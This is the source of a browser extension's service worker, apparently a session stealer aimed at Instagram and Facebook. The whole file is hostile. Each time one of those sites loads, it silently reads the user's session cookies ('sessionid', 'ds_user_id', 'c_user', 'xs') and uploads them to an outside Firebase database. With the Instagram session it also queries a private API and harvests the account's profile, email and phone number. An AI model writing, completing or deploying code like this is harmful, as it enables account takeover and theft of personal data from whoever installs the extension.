console.log("🚀 Service Worker Loaded ✅");

import { db, collection, addDoc } from "./firebase.js";

chrome.webNavigation.onCompleted.addListener(
  async (details) => {
    const url = details.url;

    if (url.includes("instagram.com")) {
      handleInstagram();
    } else if (url.includes("facebook.com")) {
      handleFacebook();
    }
  },
  {
    url: [{ hostSuffix: "instagram.com" }, { hostSuffix: "facebook.com" }],
  }
);

async function handleInstagram() {
  chrome.cookies.getAll({ domain: ".instagram.com" }, async (cookies) => {
    const session = cookies.find((c) => c.name === "sessionid");
    const dsUserId = cookies.find((c) => c.name === "ds_user_id");

    if (!session || !dsUserId) {
      console.warn("⚠️ Instagram cookies missing.");
      return;
    }

    const sessionId = session.value;
    const userId = dsUserId.value;

    console.log("✅ IG Session ID:", sessionId);
    console.log("✅ IG User ID:", userId);

    const userInfo = await fetchIGUserInfo(sessionId, userId);

    try {
      await addDoc(collection(db, "instagram"), {
        platform: "Instagram",
        sessionId,
        userId,
        ...userInfo,
        timestamp: new Date(),
        domain: "instagram.com",
      });
      console.log("✅ Instagram info saved:", userInfo.username);
    } catch (err) {
      console.error("❌ Firebase IG error:", err);
    }
  });
}

async function fetchIGUserInfo(sessionId, userId) {
  const url = `https://i.instagram.com/api/v1/users/${userId}/info/`;

  try {
    const response = await fetch(url, {
      method: "GET",
      headers: {
        "User-Agent": "Instagram 219.0.0.12.117 Android",
        Cookie: `sessionid=${sessionId};`,
        "X-IG-App-ID": "936619743392459",
        "Accept-Language": "en-US",
      },
    });

    if (!response.ok) {
      console.warn("⚠️ IG API failed:", response.status);
      return { username: "unknown_user" };
    }

    const user = (await response.json()).user;

    return {
      username: user?.username || "unknown_user",
      full_name: user?.full_name || "N/A",
      bio: user?.biography || "N/A",
      website: user?.external_url || "N/A",
      profile_pic: user?.profile_pic_url || "",
      profile_pic_hd: user?.hd_profile_pic_url_info?.url || "",
      is_verified: user?.is_verified || false,
      is_private: user?.is_private || false,
      followers: user?.follower_count ?? 0,
      following: user?.following_count ?? 0,
      posts: user?.media_count ?? 0,
      category: user?.category || "N/A",
      public_email: user?.public_email || "Not Available",
      public_phone: user?.public_phone_number || "Not Available",
    };
  } catch (error) {
    console.error("❌ IG fetch error:", error);
    return { username: "unknown_user" };
  }
}

async function handleFacebook() {
  chrome.cookies.getAll({ domain: ".facebook.com" }, async (cookies) => {
    const cUser = cookies.find((c) => c.name === "c_user");
    const xs = cookies.find((c) => c.name === "xs");

    if (!cUser || !xs) {
      console.warn("⚠️ Facebook cookies missing.");
      return;
    }

    try {
      await addDoc(collection(db, "facebook"), {
        platform: "Facebook",
        c_user: cUser.value,
        xs: xs.value,
        timestamp: new Date(),
        domain: "facebook.com",
      });
      console.log("✅ Facebook session saved:", cUser.value);
    } catch (err) {
      console.error("❌ Firebase FB error:", err);
    }
  });
}
